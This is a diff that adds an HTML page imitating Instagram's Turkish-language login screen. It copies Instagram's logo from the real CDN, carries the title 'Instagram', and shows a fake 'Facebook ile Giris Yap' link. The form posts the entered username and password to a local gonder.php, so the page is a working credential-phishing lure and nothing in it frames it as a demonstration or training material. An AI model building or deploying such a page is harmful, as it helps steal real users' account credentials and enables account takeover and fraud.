@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <link rel="stylesheet" href="instastyle.css" />
+    <title>Instagram</title>
+    <link rel="icon" type="image/x-icon" href="./favicon.ico" />
+</head>
+
+<style>
+    body {
+        background: #eee;
+    }
+
+    form {
+        height: 500px;
+        width: 400px;
+        background: #fff;
+        border-radius: 12px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
+    }
+
+    .center-container {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .center-container .form-group {
+        margin-bottom: 20px;
+        width: 80%;
+        margin-bottom: 10px;
+        padding: 8px 12px;
+        border: 1px solid #dbdbdb;
+        box-sizing: border-box;
+        border-radius: 3px;
+    }
+
+    .Gonder {
+        width: 80%;
+        background-color: #3897f0;
+        border: 1px solid #3897f0;
+        padding: 5px 12px;
+        color: #fff;
+        font-weight: bold;
+        cursor: pointer;
+        border-radius: 3px;
+    }
+
+    .center-container .form-group:last-child {
+        margin-bottom: 0;
+    }
+
+    .label-text {
+        display: inline-block;
+        margin-left: 10px;
+    }
+    label {
+            border: none;
+        }
+</style>
+
+<body>
+
+    <div class="center-container">
+        <form action="./gonder.php" method="post">
+            <div aria-disabled="false" role="button" tabindex="0" style="cursor: pointer;"><i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block; position: relative; top: -45px;"></i></div>
+            <div class="form-group">
+                <input type="text" placeholder="Telefon numarasi, kullanici adi veya e-posta" id="username" name="username" required style="border: none;">
+            </div>
+            <div class="form-group">
+                <input type="password" placeholder="Sifre" id="password" name="password" required style="border: none;">
+            </div>
+            <input type="submit" value="Gonder" class="Gonder">     
+            <h1 style="opacity: 40%; font-size: 12px; position: relative; left: 0px; top: 20px;">YA DA</h1>
+            <a href="" style="position: relative; top: 30px; ">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Facebook_logo_%28square%29.png/800px-Facebook_logo_%28square%29.png" alt="Facebook Logo" style="position: relative; top: 1px; width: 15px; width: 15px;">
+                Facebook ile Giris Yap
+              </a>
+              <a href="" style="position: relative; top: 60px; font-size: 15px;">Sifreni mi unuttun?</a>
+            
+        </form>
+    </div>
+</body>
+
+</html>
